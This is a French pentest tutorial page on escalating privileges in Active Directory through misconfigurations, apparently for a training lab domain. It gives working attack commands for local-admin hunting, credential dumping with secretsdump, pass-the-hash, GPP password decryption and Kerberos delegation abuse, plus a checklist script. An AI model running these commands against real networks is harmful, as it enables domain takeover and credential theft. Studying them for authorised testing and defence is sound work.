# Acces privilegies et misconfigurations

Au-dela des ACL, de nombreuses misconfigurations AD offrent des chemins vers l'escalade de privileges : acces admin local sur des serveurs critiques, delegations Kerberos mal configurees, partages ouverts avec des credentials en clair, Group Policy Preferences avec des mots de passe recuperables.

## Pourquoi

Les grandes infrastructures AD accumulent des configurations legacy, des delegations temporaires jamais revoquees, et des raccourcis d'administration. Ces misconfigurations sont souvent plus faciles a exploiter qu'une vulnerabilite logicielle, et elles sont presentes dans la quasi-totalite des environnements AD.

## Comment ca marche

### Acces admin local et mouvement lateral

Un compte avec des droits d'admin local sur un hote ou un Domain Admin a une session active est un chemin direct vers la compromission du domaine.

```bash
# - Trouver les postes ou on est admin local
crackmapexec smb 172.16.5.0/23 -u '<USER>' -p '<PASSWORD>' | grep "Pwn3d"
```

```powershell
# - Depuis Windows avec PowerView
Find-LocalAdminAccess -Verbose
```

Si on est admin local sur un hote avec une session DA :

```bash
# - Dumper les credentials avec secretsdump
secretsdump.py '<USER>':'<PASSWORD>'@<IP_CIBLE>

# - Pass-the-Hash
crackmapexec smb <IP_DC> -u 'Administrator' -H '<NTLM_HASH>'
psexec.py -hashes ':<NTLM_HASH>' INLANEFREIGHT.LOCAL/Administrator@<IP_DC>
```

### Group Policy Preferences (GPP)

Les anciennes GPP stockaient des mots de passe dans des fichiers XML sur SYSVOL, chiffres avec une cle AES publiee par Microsoft. Tout utilisateur du domaine peut lire SYSVOL.

```bash
# - Chercher les fichiers GPP
crackmapexec smb <IP_DC> -u '<USER>' -p '<PASSWORD>' -M gpp_password

# - Ou manuellement
smbclient \\\\<IP_DC>\\SYSVOL -U '<USER>%<PASSWORD>'
# Naviguer vers Policies/<GUID>/Machine/Preferences/Groups/Groups.xml

# - Dechiffrer avec gpp-decrypt
gpp-decrypt <CPASSWORD_VALUE>
```

{% hint style="info" %}
Microsoft a patche cette vulnerabilite en 2014 (MS14-025), mais les anciens fichiers GPP restent souvent sur SYSVOL. Meme apres le patch, les fichiers existants ne sont pas supprimes automatiquement.
{% endhint %}

### Delegations Kerberos

La delegation permet a un service d'agir au nom d'un utilisateur aupres d'un autre service. Une delegation non contrainte (`Unconstrained Delegation`) sur un serveur signifie que ce serveur stocke les TGT de tous les utilisateurs qui s'y connectent.

```powershell
# - Trouver les hotes avec delegation non contrainte
Get-DomainComputer -Unconstrained | Select-Object dnshostname

# - Si on compromet un hote avec delegation non contrainte,
#   les TGT en memoire peuvent etre extraits avec Rubeus
.\Rubeus.exe monitor /interval:5 /filteruser:Administrator
```

La delegation contrainte (`Constrained Delegation`) limite les services cibles mais peut encore etre abusee :

```bash
# - Trouver les comptes avec delegation contrainte
GetUserSPNs.py INLANEFREIGHT.LOCAL/'<USER>':'<PASSWORD>' -dc-ip <IP_DC>

# - Depuis Linux, abuser avec getST.py (S4U2Self + S4U2Proxy)
getST.py -spn 'cifs/<TARGET_HOST>' -impersonate Administrator \
    INLANEFREIGHT.LOCAL/'<SVC_USER>':'<PASSWORD>' -dc-ip <IP_DC>
```

### Misconfigurations courantes

| Misconfiguration | Risque | Detection |
|---|---|---|
| Tous les users dans Remote Desktop Users | Acces RDP massif | `Get-DomainGroupMember "Remote Desktop Users"` |
| Exchange Windows Permissions avec WriteDACL | DCSync via Exchange | BloodHound |
| DNSAdmins membership | DLL injection sur le DC | `Get-DomainGroupMember "DnsAdmins"` |
| Backup Operators | Lecture du NTDS.dit | `Get-DomainGroupMember "Backup Operators"` |
| LAPS non deploye | Meme mot de passe admin local partout | `Get-DomainComputer \| Select ms-mcs-admpwd` |
| Print Operators | Chargement de drivers sur le DC | Groupes privilegies |
| Server Operators | Services et partages sur le DC | Groupes privilegies |

### Le probleme du double hop Kerberos

Quand on est connecte a un hote via WinRM ou PowerShell Remoting et qu'on essaie d'acceder a une ressource reseau depuis cette session, l'authentification echoue. C'est le "double hop" : notre TGT n'est pas transmis a la session distante.

Solutions :

{% tabs %}
{% tab title="PSCredential" %}
```powershell
# - Passer les credentials explicitement
$cred = Get-Credential
Invoke-Command -ComputerName <HOST> -Credential $cred -ScriptBlock {
    Get-ADUser -Filter * -Server <DC>
}
```
{% endtab %}
{% tab title="Register-PSSessionConfiguration" %}
```powershell
# - Enregistrer une configuration de session avec RunAs
Register-PSSessionConfiguration -Name DoubleSaut -RunAsCredential INLANEFREIGHT\admin
Enter-PSSession -ComputerName <HOST> -ConfigurationName DoubleSaut
```
{% endtab %}
{% endtabs %}

## En pratique

```bash
# Checklist des misconfigurations a verifier

# 1 - Admin local sur plusieurs hotes
crackmapexec smb 172.16.5.0/23 -u '<USER>' -p '<PASSWORD>'

# 2 - GPP passwords
crackmapexec smb <IP_DC> -u '<USER>' -p '<PASSWORD>' -M gpp_password

# 3 - Descriptions avec des mots de passe
crackmapexec ldap <IP_DC> -u '<USER>' -p '<PASSWORD>' \
    -M get-desc-users

# 4 - Delegation non contrainte
ldapsearch -H ldap://<IP_DC> -D '<USER>@INLANEFREIGHT.LOCAL' \
    -w '<PASSWORD>' -b "DC=INLANEFREIGHT,DC=LOCAL" \
    "(userAccountControl:1.2.840.113556.1.4.803:=524288)" dn

# 5 - Groupes privilegies
for group in "DNSAdmins" "Backup Operators" "Server Operators" \
    "Print Operators" "Exchange Windows Permissions"; do
    echo "=== $group ==="
    rpcclient -U '<USER>%<PASSWORD>' <IP_DC> -c "enumgroup" | grep -i "$group"
done
```

## Pieges et galeres

- **Pass-the-Hash et AES** : si NTLM est desactive (rare mais possible), le PtH ne fonctionne pas. Utiliser Overpass-the-Hash (demander un TGT avec le hash NTLM puis utiliser le TGT)
- **Delegation et privileged users** : les comptes dans le groupe "Protected Users" ne peuvent pas etre delegues. Si la cible d'impersonation est dans ce groupe, la delegation echoue
- **GPP et faux positifs** : certains fichiers GPP ont des cpassword vides ou obsoletes. Toujours tester les credentials extraits
- **Nettoyage** : apres avoir exploite une misconfiguration (ajout a un groupe, modification de delegation), documenter et reverter les changements

## Retour terrain

Les misconfigurations AD sont le pain quotidien du pentester. Chaque environnement a son lot de delegations oubliees, de groupes trop permissifs, et de mots de passe dans des endroits inattendus. Les GPP passwords sont de plus en plus rares (patch de 2014), mais les descriptions de comptes avec des mots de passe en clair restent etonnamment courantes. Le groupe DNSAdmins est un classique souvent neglige : un simple membre peut injecter une DLL arbitraire dans le service DNS du DC.

## Memo express

| Technique | Commande | Impact |
|---|---|---|
| Admin local | `crackmapexec smb <range> -u -p` | Mouvement lateral |
| GPP passwords | `crackmapexec smb <DC> -M gpp_password` | Credentials en clair |
| Pass-the-Hash | `psexec.py -hashes ':<hash>' user@host` | Acces avec hash NTLM |
| Delegation non contrainte | `Get-DomainComputer -Unconstrained` | TGT en memoire |
| DNSAdmins | DLL injection via dnscmd | Execution de code sur le DC |

***
